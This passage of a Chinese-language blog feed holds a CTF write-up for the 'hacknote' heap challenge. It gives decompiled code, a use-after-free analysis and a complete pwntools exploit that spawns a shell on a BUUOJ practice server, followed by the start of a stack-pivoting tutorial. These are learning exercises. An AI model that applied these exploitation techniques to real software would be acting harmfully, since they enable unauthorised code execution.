c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">print_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v2 <span class=\"token operator\">>=</span> count <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>__cdecl <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>add_note：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">add_note</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// esi</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  result <span class=\"token operator\">=</span> count<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> count <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Full\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Alloca Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> print_note_content<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note size :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      size <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      v1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Alloca Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>notelist <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token operator\">++</span>count<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>仍然是堆的菜单题</p>\n<p>gdb 调试随便输入几个查看堆，这里是 <code>tcache</code>  应该是需要切换 glibc 版本：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqx5E6.png\" alt=\"\" /></p>\n<p>再删除 <code>index1</code>  看看<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqztIK.png\" alt=\"\" /></p>\n<p><code>bin:</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPqzUPO.png\" alt=\"\" /></p>\n<p>此时我们发现他的操作都是两个两个一起的，看一看地址情况</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPqzfzQ.png\" alt=\"\" /></p>\n<p>再查看一下程序产生的 0x10 的 <code>chunk</code>  的 fd 是是什么<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLSneI.png\" alt=\"\" /></p>\n<p>这里发现是一个 <code>print_note_content</code>  函数，利用 ida 看一下<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLSlY8.png\" alt=\"\" /></p>\n<p>反汇编，发现是一个 puts :</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">print_note_content</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>设置个断点然后运行一下<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLSy6J.png\" alt=\"\" /><br />\n这里发现刚好会 <code>print_note_content</code>  函数断开<br />\n这里也就输出我们的内容：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLS4fO.png\" alt=\"\" /></p>\n<p>也就是说我们调用 <code>print_not</code>  就会通过该地址值来输出内容（因为 <code>print_note</code>  中并没有打印内容的函数）<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPL9Yaq.png\" alt=\"\" /></p>\n<p>这里就知道了 <code>chunk</code>  的 fd 指向了 <code>print_note_content</code>  回去执行打印内容</p>\n<h2 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h2>\n<p>查看字符串，发现有 <code>/bin/sh</code> ：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqx0H0.png\" alt=\"\" /></p>\n<p>跟进去看看，发现直接是个后门，没有开启 pie，所以我们可以利用：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPqxrNT.png\" alt=\"\" /></p>\n<p>这里发现 <code>delete_note函数</code> 并没有将指针置空，【错误的】 也就没有将对应的 index 号置空，也就是说，即使删除 index 后我们再次申请的 index 号仍然会增加，但是和之前删除的指向的是同一个地址</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/01/pPL95sH.png\" alt=\"\" /></p>\n<p>这里试一下将  <code>index1删除</code> ，再申请同样大小的 <code>chunk</code>  内容为 <code>www</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/10/01/pPLCKT1.png\" alt=\"\" /></p>\n<p>看到原本的 index1 的内容被覆盖了，现在就要想办法将上面的 <code>0x11</code>  的 <code>chunk</code>  的 fd 改写为后门函数的地址即可</p>\n<p>我们知道 size 对应的 0x11 实际 chunk 的大小为 0x8，而执行 <code>delete_note</code>  函数时会将两个一起释放，那么我们只要将释放的 <code>0x8</code>  大小的 <code>chunk</code>  从 fastbin 中回收再改写 <code>fd</code>  即可即可</p>\n<h2 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27648</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process(\"./hacknote\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>system_binsh<span class=\"token operator\">=</span><span class=\"token number\">0x8048945</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Note size :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content :\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Success !\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">print_a</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这里要加换行，不然无法成功</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bbbb\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"cccc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>system_binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这里的 8 是程序创建的 chunk 的大小释放后被我们申请回来利用，原本这里 fd 存放的是 print_note_content</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>print_a<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#给 index0 申请 chunk1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/02/pPLQeXR.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/28/pwn/%E4%B8%93%E6%A0%8F/%E6%A0%88%E8%BF%81%E7%A7%BB/",
            "url": "https://vvwwvv.cn/2023/09/28/pwn/%E4%B8%93%E6%A0%8F/%E6%A0%88%E8%BF%81%E7%A7%BB/",
            "title": "栈迁移",
            "date_published": "2023-09-28T06:15:56.000Z",
            "content_html": "<p>（之前写的没保存，这是第二遍写，我要杀人...）</p>\n<h1 id=\"栈的结构\"><a class=\"anchor\" href=\"#栈的结构\">#</a> 栈的结构</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/28/pPb4Xp8.png\" alt=\"\" /></p>\n<h1 id=\"栈迁移的应用场景\"><a class=\"anchor\" href=\"#栈迁移的应用场景\">#</a> 栈迁移的应用场景</h1>\n<p>栈迁移主要是为了解决栈溢出空间大小不足的问题，当我们的 ROP 链过长时很可能栈空间不够，并且 ebp 之前的空间其实只是填充一些没什么用的数据，所以需要一个新的地址空间来存放当前的 payload</p>\n<p>我们的栈</p>\n<h1 id=\"1-leave和ret命令\"><a class=\"anchor\" href=\"#1-leave和ret命令\">#</a> 1. leave 和 ret 命令</h1>\n<p>leave：</p>\n<pre><code>mov  esp , ebp\npop   ebp       #执行pop时，ebp出栈，并且将esp地址内的值放入ebp\n</code></pre>\n<p>这里要注意  <code>mov esp,ebp</code>  是将 ebp 的地址付给 esp，也就是说将 esp 从栈顶拉下来到 ebp 的位置， <code>pop ebp</code>  是将 esp 内部的值给 ebp</p>\n<p>ret：</p>\n<pre><code>pop eip  #将esp的值放入eip，让eip寄存器去执行，并且esp+4\n</code></pre>\n<h1 id=\"2栈迁移\"><a class=\"anchor\" href=\"#2栈迁移\">#</a> 2. 栈迁移</h1>\n<p>首先要利用栈迁移需要通过溢出来改写部分数据，将 ebp 的值改为伪造的栈的栈顶，ret 一般改到 read 处来改写伪造的栈的数据【使伪造的栈的栈顶（ <code>fake_esp</code> ）存入 <code>fake_ebp</code>  的栈低】<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/29/pPqEOZ4.png\" alt=\"\" /></p>\n<p>栈迁移要使用两次 leave_ret 来转移栈</p>\n<h2 id=\"第一次leave_ret来源于ebp后的ret\"><a class=\"anchor\" href=\"#第一次leave_ret来源于ebp后的ret\">#</a> 第一次 <code>leave_ret</code>  (来源于 ebp 后的 ret)</h2>\n<ol>\n<li>\n<p>leave:</p>\n<p>mov esp , ebp // 将 ebp 的地址赋给 esp，相当于将 esp 指向 ebp 相同的地方</p>\n</li>\n</ol>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/29/pPqVMy8.png\" alt=\"\" /></p>\n<pre><code>pop ebp //将esp指向的地方的值给ebp，这里是值，值！（等于将fake_esp的地址给了ebp），然后esp+4\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/29/pPqValV.md.png\" alt=\"\" /></p>\n<p>第一次写的时候有个疑问，第一次的 leave_ret 到底用的是谁的 <code>leave_ret</code>  ，如果是 ebp 后的 ret 的，那么为什么后面还要在 ret 后加一个 <code>leave_ret</code> ，这样加上 read 里面的 <code>leave_ret</code>  相当与 3 个了；而如果用的是 read 内的 <code>leave_ret</code>  那不是会将 esp 拉到伪造的 ebp 处吗，一个 ret 的地址就执行了两个 <code>leave_ret</code> ？</p>\n<p>我自己的理解：调用的 read 会在开辟一个新的栈帧，它的内部的 <code>leave_ret</code>  不会干扰外面栈的寄存器，所以等于使用的是 ebp 后面的 ret</p>\n<p>2.ret</p>\n<pre><code>pop eip //将这里esp的值给eip，让eip去执行`read`，然后esp+4\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/29/pPqV4mD.png\" alt=\"\" /></p>\n<h2 id=\"第二次调用leave_ret来源于leave_ret\"><a class=\"anchor\" href=\"#第二次调用leave_ret来源于leave_ret\">#</a> 第二次调用 <code>leave_ret</code>  (来源于 leave_ret)</h2>\n<p>【这里我们迁移过去要看看我们输入的值是在哪个地址，有时不是在迁移过去的起始处输入的】</p>\n<ol>\n<li>\n<p>leave</p>\n<p>mov esp,ebp  // 将 ebp 的地址给 esp，这次使 esp 指向 fake_esp<br />\n<img 